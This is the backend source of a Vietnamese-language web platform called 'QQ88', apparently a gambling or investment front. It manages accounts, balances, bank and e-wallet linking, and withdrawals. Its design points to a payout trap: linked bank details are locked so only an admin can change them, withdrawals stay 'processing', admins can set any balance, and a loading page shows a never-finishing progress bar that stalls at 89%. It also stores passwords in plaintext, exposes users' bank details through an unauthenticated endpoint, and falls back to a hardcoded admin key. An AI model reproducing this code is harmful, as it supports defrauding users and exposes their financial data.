const express = require('express');
const fs = require('fs');
const path = require('path');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Phục vụ toàn bộ file tĩnh và thư mục public/images
app.use(express.static(path.join(__dirname, 'public')));

// ĐƯỜNG DẪN TRANG CHỦ (FIX LỖI CANNOT GET /)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==========================================
// 1. CẤU HÌNH LƯU TRỮ KÉP (DATA.JSON + MONGODB)
// ==========================================
const MONGO_URI = process.env.MONGO_URI || '';
let isMongoConnected = false;

const userSchema = new mongoose.Schema({
    username: { type: String, unique: true, required: true },
    password: { type: String, required: true },
    fullName: { type: String, default: '' },
    phone: { type: String, default: '' },
    balance: { type: Number, default: 0 }, // Đơn vị: Điểm (1.43 = 1.43K)
    vipLevel: { type: Number, default: 0 },
    joinDate: { type: String, default: () => new Date().toISOString().split('T')[0] },
    withdrawPassword: { type: String, default: '' },
    isBankLocked: { type: Boolean, default: false },
    bankInfo: {
        bankName: { type: String, default: '' },
        accountNumber: { type: String, default: '' },
        accountHolder: { type: String, default: '' }
    },
    cryptoInfo: {
        network: { type: String, default: '' },
        walletAddress: { type: String, default: '' }
    },
    momoInfo: {
        phone: { type: String, default: '' },
        accountHolder: { type: String, default: '' }
    },
    withdrawHistory: { type: Array, default: [] },
    depositHistory: { type: Array, default: [] }
}, { minimize: false });

const UserModel = mongoose.models.User || mongoose.model('User', userSchema);

if (MONGO_URI) {
    mongoose.connect(MONGO_URI)
        .then(async () => {
            isMongoConnected = true;
            console.log('✅ Đã kết nối MongoDB Atlas thành công');
            await syncMongoToLocal();
        })
        .catch(err => console.error('⚠️ Lỗi kết nối MongoDB, dùng data.json cục bộ:', err.message));
}

// Đọc dữ liệu từ data.json
function readLocalData() {
    try {
        if (!fs.existsSync(DATA_FILE)) {
            const initialData = { users: {} };
            fs.writeFileSync(DATA_FILE, JSON.stringify(initialData, null, 2), 'utf8');
            return initialData;
        }
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(raw || '{"users":{}}');
    } catch (e) {
        return { users: {} };
    }
}

// Ghi dữ liệu vào data.json
function writeLocalData(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {
        console.error('Lỗi ghi file data.json:', e.message);
    }
}

// Đồng bộ từ MongoDB về data.json khi khởi động server
async function syncMongoToLocal() {
    if (!isMongoConnected) return;
    try {
        const users = await UserModel.find({}).lean();
        const localData = readLocalData();
        if (!localData.users) localData.users = {};
        users.forEach(u => {
            localData.users[u.username] = u;
        });
        writeLocalData(localData);
    } catch (e) {
        console.error('Lỗi đồng bộ Mongo -> Local:', e.message);
    }
}

// Lưu thông tin 1 user vào cả data.json và MongoDB
async function saveUserDual(userObj) {
    const localData = readLocalData();
    if (!localData.users) localData.users = {};
    localData.users[userObj.username] = userObj;
    writeLocalData(localData);

    if (isMongoConnected) {
        try {
            await UserModel.findOneAndUpdate(
                { username: userObj.username },
                { $set: userObj },
                { upsert: true, new: true }
            );
        } catch (e) {
            console.error('Lỗi lưu MongoDB:', e.message);
        }
    }
}

// Lấy thông tin 1 user
async function getUserDual(username) {
    const key = String(username || '').trim().toLowerCase();
    const localData = readLocalData();
    if (localData.users && localData.users[key]) {
        return localData.users[key];
    }
    if (isMongoConnected) {
        const u = await UserModel.findOne({ username: key }).lean();
        if (u) {
            if (!localData.users) localData.users = {};
            localData.users[key] = u;
            writeLocalData(localData);
            return u;
        }
    }
    return null;
}

// Hàm che tên chủ tài khoản kiểu D*****
function maskFullName(name) {
    if (!name || name.length === 0) return 'N*****';
    const clean = name.trim().toUpperCase();
    return clean.charAt(0) + '*****';
}

// ==========================================
// 2. API ĐĂNG KÝ & ĐĂNG NHẬP
// ==========================================
app.post('/api/register', async (req, res) => {
    try {
        const { username, password, fullName, phone } = req.body;
        if (!username || !password) {
            return res.status(400).json({ success: false, message: 'Vui lòng nhập đầy đủ tài khoản và mật khẩu!' });
        }

        const cleanUser = username.trim().toLowerCase();
        const existing = await getUserDual(cleanUser);
        if (existing) {
            return res.status(400).json({ success: false, message: 'Tên tài khoản đã tồn tại!' });
        }

        const today = new Date().toISOString().split('T')[0];
        const newUser = {
            username: cleanUser,
            password: password.trim(),
            fullName: (fullName || 'NGUYEN VAN A').trim().toUpperCase(),
            phone: (phone || '').trim(),
            balance: 0,
            vipLevel: 0,
            joinDate: today,
            withdrawPassword: '',
            isBankLocked: false,
            bankInfo: { bankName: '', accountNumber: '', accountHolder: '' },
            cryptoInfo: { network: '', walletAddress: '' },
            momoInfo: { phone: '', accountHolder: '' },
            withdrawHistory: [],
            depositHistory: []
        };

        await saveUserDual(newUser);
        return res.json({
            success: true,
            message: 'Đăng ký tài khoản thành công!',
            user: sanitizeUser(newUser)
        });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Lỗi máy chủ!' });
    }
});

app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) {
            return res.status(400).json({ success: false, message: 'Vui lòng nhập tên đăng nhập và mật khẩu!' });
        }

        const cleanUser = username.trim().toLowerCase();
        const user = await getUserDual(cleanUser);
        if (!user || user.password !== password.trim()) {
            return res.status(401).json({ success: false, message: 'Tài khoản hoặc mật khẩu không chính xác!' });
        }

        return res.json({
            success: true,
            message: 'Đăng nhập thành công!',
            user: sanitizeUser(user)
        });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Lỗi máy chủ!' });
    }
});

// Lấy thông tin tài khoản mới nhất (Đồng bộ số dư)
app.get('/api/user/:username', async (req, res) => {
    try {
        const user = await getUserDual(req.params.username);
        if (!user) {
            return res.status(404).json({ success: false, message: 'Không tìm thấy tài khoản!' });
        }
        return res.json({ success: true, user: sanitizeUser(user) });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Lỗi máy chủ!' });
    }
});

function sanitizeUser(u) {
    return {
        username: u.username,
        fullName: u.fullName,
        maskedName: maskFullName(u.fullName),
        phone: u.phone,
        balance: Number(u.balance || 0),
        vipLevel: u.vipLevel || 0,
        joinDate: u.joinDate || '2026-09-30',
        hasWithdrawPassword: Boolean(u.withdrawPassword && u.withdrawPassword.length > 0),
        isBankLocked: Boolean(u.isBankLocked),
        bankInfo: u.bankInfo || { bankName: '', accountNumber: '', accountHolder: '' },
        cryptoInfo: u.cryptoInfo || { network: '', walletAddress: '' },
        momoInfo: u.momoInfo || { phone: '', accountHolder: '' },
        withdrawHistory: u.withdrawHistory || [],
        depositHistory: u.depositHistory || []
    };
}

// ==========================================
// 3. API THÊM NGÂN HÀNG & KHÓA CỨNG VĨNH VIỄN
// ==========================================
app.post('/api/user/bind-bank', async (req, res) => {
    try {
        const { username, bankName, accountNumber, withdrawPassword } = req.body;
        const user = await getUserDual(username);

        if (!user) {
            return res.status(404).json({ success: false, message: 'Tài khoản không tồn tại!' });
        }

        if (user.isBankLocked || (user.bankInfo && user.bankInfo.accountNumber)) {
            return res.status(403).json({
                success: false,
                message: 'Tài khoản ngân hàng đã được khóa bảo mật vĩnh viễn. Chỉ Admin mới có quyền thay đổi!'
            });
        }

        if (!bankName || !accountNumber) {
            return res.status(400).json({ success: false, message: 'Vui lòng chọn ngân hàng và nhập số tài khoản!' });
        }

        if (!user.withdrawPassword && !withdrawPassword) {
            return res.status(400).json({ success: false, message: 'Vui lòng cài đặt mật khẩu rút tiền!' });
        }

        user.bankInfo = {
            bankName: bankName.trim(),
            accountNumber: accountNumber.trim(),
            accountHolder: user.fullName || 'NGUYEN VAN A'
        };

        if (!user.withdrawPassword && withdrawPassword) {
            user.withdrawPassword = withdrawPassword.trim();
        }

        user.isBankLocked = true;

        await saveUserDual(user);

        return res.json({
            success: true,
            message: 'Liên kết thẻ ngân hàng và cài đặt mật khẩu rút tiền thành công!',
            user: sanitizeUser(user)
        });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Lỗi hệ thống khi lưu ngân hàng!' });
    }
});

// ==========================================
// 4. API RÚT TIỀN
// ==========================================
app.post('/api/user/withdraw', async (req, res) => {
    try {
        const { username, amount, withdrawPassword, method } = req.body;
        const user = await getUserDual(username);

        if (!user) {
            return res.status(404).json({ success: false, message: 'Không tìm thấy người dùng!' });
        }

        if (!user.isBankLocked || !user.bankInfo || !user.bankInfo.accountNumber) {
            return res.status(400).json({ success: false, message: 'Vui lòng bấm dấu (+) để thêm thẻ ngân hàng trước khi rút tiền!' });
        }

        if (!withdrawPassword || user.withdrawPassword !== withdrawPassword.trim()) {
            return res.status(401).json({ success: false, message: 'Mật khẩu rút tiền không chính xác!' });
        }

        const numAmount = Number(amount);
        if (isNaN(numAmount) || numAmount < 100) {
            return res.status(400).json({ success: false, message: 'Số tiền rút tối thiểu là 100 điểm (100,000 VNĐ)!' });
        }

        if (numAmount > Number(user.balance || 0)) {
            return res.status(400).json({ success: false, message: 'Số dư khả dụng không đủ để thực hiện lệnh rút!' });
        }

        user.balance = Number((user.balance - numAmount).toFixed(2));
        const record = {
            id: 'WD' + Date.now(),
            amount: numAmount,
            method: method || 'Thẻ ngân hàng',
            bankName: user.bankInfo.bankName,
            accountNumber: user.bankInfo.accountNumber,
            status: 'Đang xử lý',
            time: new Date().toLocaleString('vi-VN')
        };

        if (!Array.isArray(user.withdrawHistory)) user.withdrawHistory = [];
        user.withdrawHistory.unshift(record);

        await saveUserDual(user);

        return res.json({
            success: true,
            message: 'Gửi lệnh rút tiền thành công! Hệ thống đang xử lý.',
            user: sanitizeUser(user)
        });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Lỗi xử lý rút tiền!' });
    }
});

// ==========================================
// 5. API DÀNH RIÊNG CHO ADMIN
// ==========================================
app.post('/api/admin/update-user', async (req, res) => {
    try {
        const { adminKey, username, balance, bankName, accountNumber, fullName, withdrawPassword, isBankLocked } = req.body;
        const VALID_ADMIN_KEY = process.env.ADMIN_KEY || 'qq88admin';
        if (adminKey !== VALID_ADMIN_KEY) {
            return res.status(403).json({ success: false, message: 'Không có quyền Admin!' });
        }

        const user = await getUserDual(username);
        if (!user) {
            return res.status(404).json({ success: false, message: 'Không tìm thấy tài khoản người chơi!' });
        }

        if (balance !== undefined) user.balance = Number(balance);
        if (fullName !== undefined) user.fullName = fullName.trim().toUpperCase();
        if (withdrawPassword !== undefined) user.withdrawPassword = withdrawPassword.trim();
        if (isBankLocked !== undefined) user.isBankLocked = Boolean(isBankLocked);

        if (bankName !== undefined || accountNumber !== undefined) {
            user.bankInfo = {
                bankName: bankName !== undefined ? bankName : user.bankInfo.bankName,
                accountNumber: accountNumber !== undefined ? accountNumber : user.bankInfo.accountNumber,
                accountHolder: user.fullName
            };
        }

        await saveUserDual(user);
        return res.json({ success: true, message: 'Admin đã cập nhật thông tin người chơi!', user: sanitizeUser(user) });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Lỗi cập nhật Admin!' });
    }
});

// ==========================================
// 6. TRANG LOADING XOAY VÔ TẬN
// ==========================================
app.get('/loading-gateway', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Đang kết nối máy chủ QQ88...</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #f4f6f8;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #333;
        }
        .spinner {
            width: 54px;
            height: 54px;
            border: 4px solid rgba(0, 122, 51, 0.18);
            border-top-color: #007a33;
            border-radius: 50%;
            animation: spin 0.85s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status-text {
            font-size: 15px;
            font-weight: 600;
            color: #006837;
            margin-bottom: 12px;
        }
        .progress-box {
            width: 240px;
            height: 6px;
            background: #e0e5e9;
            border-radius: 99px;
            overflow: hidden;
        }
        .progress-bar {
            width: 15%;
            height: 100%;
            background: linear-gradient(90deg, #007a33, #00b84c);
            animation: stallProgress 18s ease-out infinite;
        }
        @keyframes stallProgress {
            0% { width: 5%; }
            30% { width: 45%; }
            60% { width: 78%; }
            85% { width: 88%; }
            100% { width: 89%; }
        }
        .sub-note {
            onboarding-top: 14px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="status-text">Đang đồng bộ đường truyền máy chủ...</div>
    <div class="progress-box"><div class="progress-bar"></div></div>
    <div class="sub-note">Vui lòng không đóng trình duyệt...</div>
</body>
</html>`);
});

app.listen(PORT, () => {
    console.log(`🚀 Server QQ88 đang chạy tại cổng ${PORT}`);
});
